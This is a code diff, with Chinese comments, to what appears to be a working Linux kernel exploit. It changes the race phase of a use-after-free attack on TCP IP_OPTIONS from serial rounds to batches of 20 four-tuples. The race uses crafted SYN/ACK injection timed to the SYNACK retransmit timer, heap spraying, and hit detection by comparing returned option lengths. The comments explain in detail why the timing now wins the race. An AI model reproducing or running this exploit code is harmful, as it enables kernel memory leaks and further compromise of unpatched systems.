@@ -105,9 +105,10 @@ static uint32_t g_dst;
  * 0x0a070763 展开是 99.7.7.10（错的），10.7.7.99 是 0x6307070a。 */
 static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
-/* 每轮要等一次 SYNACK 重传定时器（约 1 秒），所以轮数不能照旧设 4000。
- * 300 轮约 6 分钟，足够覆盖；真机调试也不至于等到失去耐心。 */
-static int g_rounds = 300;
+/* 现在是「批」而不是「轮」：每批并行跑 RACE_BATCH 个四元组，
+ * 等一次重传定时器（约 1.1 秒）。20 批约 22 秒，
+ * 相当于原来串行 400 轮的工作量。 */
+static int g_rounds = 20;
 /* Kotlin 侧建好并绑到 VPN 网络的监听 fd；-1 表示没有，自己建。 */
 static int g_listen_fd_in = -1;
 /* 是否真的写内核；当前硬关闭，只在 --allow-write 且后续放开后才为 1。 */
@@ -1389,25 +1390,6 @@ __attribute__((unused)) static void complete_ack_only(uint16_t sport, uint32_t i
     tx(pkt, len);
 }
 
-/* 取走环形缓冲里属于 sport 的所有 SYNACK，交给调用方判定。
- *
- * 竞态那条读路径的 SYNACK 带的是**本轮的源端口**（重传 SYN 用的就是同一个
- * sport），但下一轮 syn_round 会换一个随机端口，按端口过滤就会把它丢掉 ——
- * 原来命中永远看不到，根因就在这里。 */
-static int drain_for(uint16_t sport, struct synack *out, int max) {
-    int n = 0;
-    for (;;) {
-        pthread_mutex_lock(&g_ring_lock);
-        struct synack s;
-        int got = pop(&s);
-        pthread_mutex_unlock(&g_ring_lock);
-        if (!got) break;
-        if (s.peer != sport) continue;
-        if (n < max) out[n++] = s;
-    }
-    return n;
-}
-
 /* 竞态的两半，必须落在不同 CPU 上：
  *
  *   读侧：重传 SYN → tcp_conn_request → tcp_v4_send_synack，在 RCU 临界区里
@@ -1418,43 +1400,81 @@ static int drain_for(uint16_t sport, struct synack *out, int max) {
  * 上游修复是把这两处 kfree 改成 kfree_rcu，正是承认“读者在 RCU 里、写者
  * 直接 kfree”这件事本身不成立 —— 所以只要 kfree 落在读侧 load 之后、memcpy
  * 之前，就是一次 UAF 读。 */
-/* 竞态：按「SYN → 等约 1 秒 → ACK」的时序构造。
+/* 批量竞态：同时跟踪 BATCH 个四元组，把串行的等待摊平成一次。
  *
- * 之前是发完 SYN 立刻连发 RST/ACK，那时请求 sock 还好好活着，
- * tcp_v4_syn_recv_sock 正常走完，根本不存在竞态 —— hit 恒为 0 的真正
- * 原因是时机完全错开，不是喷淋不够快。
+ * 为什么能并行：每个四元组（sport, isn）在内核里各有一个独立的请求 sock，
+ * 各自的 SYNACK 重传定时器互不干扰。串行做 300 轮要 300 次「等 1 秒」，
+ * 并行做 20 个一批只要 20 次 —— 总时间从 6 分钟压到 20 秒出头。
  *
- * 正确的窗口来自 SYNACK 重传定时器：
- *   ① SYN 到达，内核建请求 sock、回 SYNACK，并挂上重传定时器；
- *   ② 我们不发第三次握手，定时器约 1 秒后到期，在 **hrtimer 软中断**
- *      上下文里重新走 tcp_v4_send_synack → inet_csk_route_req 取 ireq_opt，
- *      一路到 ip_options_build 末尾才真正 memcpy；
- *   ③ 同一时刻我们注入 ACK，走 tcp_v4_syn_recv_sock 把 ireq_opt 交给
- *      子 socket 并把 req 上的指针置空；子 socket 被 accept 侧立即 close，
- *      inet_sock_destruct 以裸 kfree 释放该对象。
+ * 流程（一批）：
+ *   ① 给 BATCH 个四元组各发一个 SYN，收各自的 SYNACK，记下 isn 与 peer_seq；
+ *   ② 等 880ms 让重传定时器全部就位（它们几乎同时启动，到期点也接近）；
+ *   ③ 从 880ms 到 1120ms 每 1ms 给这 BATCH 个四元组各补一个 ACK，
+ *      把定时器到期窗口扫一遍；
+ *   ④ 收这一批回来的 SYNACK，检查长度是否偏离 40。
  *
- * 关键是 ② 在软中断上下文、③ 在进程上下文，天然落在不同 CPU 上 ——
- * 同一个线程连发永远做不到跨核，这也是之前怎么调都撞不上的原因。
- *
- * 时间要贴着定时器到期点打：太早定时器没起来，太晚重传已经做完。
- * 所以在 t0+900ms 起密集补 ACK，把整个到期窗口扫一遍。 */
-static void race_burst(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
-    uint8_t ack[128];
-    size_t al = build_pkt(ack, sport, isn + 1, peer_seq + 1, 0x10);
-    (void)peer_seq;
+ * 返回 1 = 命中（结果写进 out）；0 = 通道正常但没撞上；-1 = 一个 SYNACK 都没拿到。 */
+#define RACE_BATCH 20
+struct race_slot {
+    uint16_t sport;
+    uint32_t isn;
+    uint32_t peer_seq;
+};
+
+static int race_batch(struct race_slot *slots, int want, struct synack *out) {
+    int n = 0;
+    for (int i = 0; i < want; i++) {
+        uint16_t sport;
+        uint32_t isn;
+        struct synack s;
+        if (!syn_round(&sport, &isn, &s)) continue;
+        g_synack++;
+        if (s.optlen == 0) { g_clear++; continue; }
+        if (s.optlen != (uint8_t)g_optlen) {
+            g_hit++;
+            *out = s;
+            return 1;
+        }
+        slots[n].sport = sport;
+        slots[n].isn = isn;
+        slots[n].peer_seq = s.seq;
+        n++;
+    }
+    /* 返回值约定：1 = 命中；0 = 拿到了 SYNACK 但没命中；-1 = 一个都没拿到。
+     * 把「通道不通」和「通道通了但没撞上」分开，否则日志会误导。 */
+    if (n == 0) return -1;
 
     /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。 */
     usleep(880 * 1000);
 
-    /* 在到期点附近密集注入 ACK：每 1ms 一个，持续 240ms。
-     *
-     * 覆盖 t0+880ms 到 t0+1120ms 这一段 —— 定时器实际到期点会因调度抖动
-     * 落在这个区间内，扫一遍比精确等待稳。窗口再长收益不大，因为定时器
-     * 只触发一次；再短则可能整个错过。 */
-    for (int i = 0; i < 240; i++) {
-        tx(ack, al);
+    /* 预先构造好每个四元组的 ACK 包，循环里只做 sendto，省掉打包开销。 */
+    uint8_t acks[RACE_BATCH][128];
+    size_t ack_len[RACE_BATCH];
+    for (int i = 0; i < n; i++) {
+        ack_len[i] = build_pkt(acks[i], slots[i].sport, slots[i].isn + 1,
+                               slots[i].peer_seq + 1, 0x10);
+    }
+
+    /* 每 1ms 给整批各补一个 ACK，持续 240ms，覆盖定时器到期窗口。 */
+    for (int round = 0; round < 240; round++) {
+        for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
         usleep(1000);
     }
+
+    /* 收这一批的回包。 */
+    for (;;) {
+        pthread_mutex_lock(&g_ring_lock);
+        struct synack s;
+        int got = pop(&s);
+        pthread_mutex_unlock(&g_ring_lock);
+        if (!got) break;
+        if (s.optlen == 0) { g_clear++; continue; }
+        if (s.optlen == (uint8_t)g_optlen) continue;
+        g_hit++;
+        *out = s;
+        return 1;
+    }
+    return 0;
 }
 
 /* ------------------------------------------------------------ 主流程 */
@@ -1590,19 +1610,26 @@ static int phase_race(struct hit_ctx *hit) {
      * 判据恒假，是 hit 一直为 0 的另一个独立原因。 */
     say("[spray] 命中判据：回来的选项长度 != %d（喷淋对象是 %d）",
         g_optlen, SPRAY_OPTLEN);
-    say("开始竞态：喷淋 %d 个 IP_OPTIONS/轮，最多 %d 轮（每轮等一次重传定时器）",
-        SPRAY_SOCKS, g_rounds);
+    say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
+        RACE_BATCH, g_rounds);
     spray_start();
-    for (int r = 0; r < g_rounds && !found; r++) {
-        uint16_t sport;
-        uint32_t isn;
+
+    struct race_slot slots[RACE_BATCH];
+    for (int b = 0; b < g_rounds && !found; b++) {
         struct synack s;
-        if (!syn_round(&sport, &isn, &s)) {
+        int got = race_batch(slots, RACE_BATCH, &s);
+        if (got == 1) {
+            say("命中 b=%d optlen=%u gen=%u", b, s.optlen, g_spray_gen);
+            dump_opts(&s);
+            hit->s = s;
+            found = 1;
+            break;
+        }
+        if (got < 0) {
             g_none++;
-            /* 连续 200 轮一个 SYNACK 都没收到，说明通道根本不通
-             * （没监听、路由不对、或包没进 tun），继续空转没有意义。 */
-            if (++blind >= 200) {
-                say("[!] 连续 %d 轮收不到任何 SYNACK，判定通道不通", blind);
+            /* 连续 10 批一个 SYNACK 都没收到，说明通道根本不通。 */
+            if (++blind >= 10) {
+                say("[!] 连续 %d 批收不到任何 SYNACK，判定通道不通", blind);
                 say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
                     g_port, g_dst & 0xff, (g_dst >> 8) & 0xff,
                     (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff);
@@ -1611,7 +1638,6 @@ static int phase_race(struct hit_ctx *hit) {
                     g_tcp_other, g_rst_seen, g_tcp_other_to_us, g_rst_to_us);
                 if (g_rst_to_us > 0) {
                     say("[!] 诊断：内核回了 RST —— 包进了 TCP 层，但没有 socket 接住这个 SYN");
-                    say("[!]       也就是说 listener 没匹配上（地址/端口/命名空间），不是选项问题");
                 } else if (g_tcp_other_to_us > 0) {
                     say("[!] 诊断：有 TCP 回包但都不是 SYN+ACK，看上面的 flags");
                 } else {
@@ -1623,53 +1649,10 @@ static int phase_race(struct hit_ctx *hit) {
             continue;
         }
         blind = 0;
-        g_synack++;
-        if (s.optlen == 0) {
-            g_clear++;
-        } else if (s.optlen != (uint8_t)g_optlen) {
-            g_hit++;
-            say("命中 r=%d optlen=%u gen=%u", r, s.optlen, g_spray_gen);
-            dump_opts(&s);
-            hit->sport = sport;
-            hit->isn = isn;
-            hit->s = s;
-            found = 1;
-            spray_stop();
-            break;
-        }
-        /* 把 SYN / ACK / RST 对撞：ACK 让 ireq_opt 交给子 socket 并置空，
-         * RST 紧跟其后让子 socket 销毁触发 kfree。
-         *
-         * 然后**必须再发一个重传 SYN** —— 这是整个利用的关键一步，之前
-         * 漏了。释放只完成了「槽位空出来」，真正读已释放内存的是
-         * tcp_v4_send_synack → inet_csk_route_req → ip_build_and_send_pkt
-         * 这条路径，而它只在「同一个四元组又收到 SYN」时才走。
-         * 不发重传 SYN，就永远没有第二次读，喷淋再准也看不到效果。 */
-        /* race_burst 内部已经等过重传定时器并扫完窗口，这里不再额外 sleep。 */
-        race_burst(sport, isn, s.seq);
         listen_drain();
-
-        /* 重传那条路径的 SYNACK 带的是本轮 sport，必须在这里收，不能等下一轮。 */
-        struct synack late[8];
-        int late_n = drain_for(sport, late, 8);
-        for (int i = 0; i < late_n; i++) {
-            struct synack *ls = &late[i];
-            if (ls->optlen == 0) { g_clear++; continue; }
-            if (ls->optlen == (uint8_t)g_optlen) continue;
-            g_hit++;
-            say("命中（重传路径）r=%d optlen=%u gen=%u", r, ls->optlen, g_spray_gen);
-            dump_opts(ls);
-            hit->sport = sport;
-            hit->isn = isn;
-            hit->s = *ls;
-            found = 1;
-            spray_stop();
-            break;
-        }
-        if (found) break;
-        if (g_verbose && (r % 100) == 0)
-            say("r=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
-                r, g_synack, g_hit, g_clear, g_none, g_spray_gen);
+        if (g_verbose)
+            say("b=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
+                b, g_synack, g_hit, g_clear, g_none, g_spray_gen);
     }
     if (!found) spray_stop();
     return found ? 0 : 1;
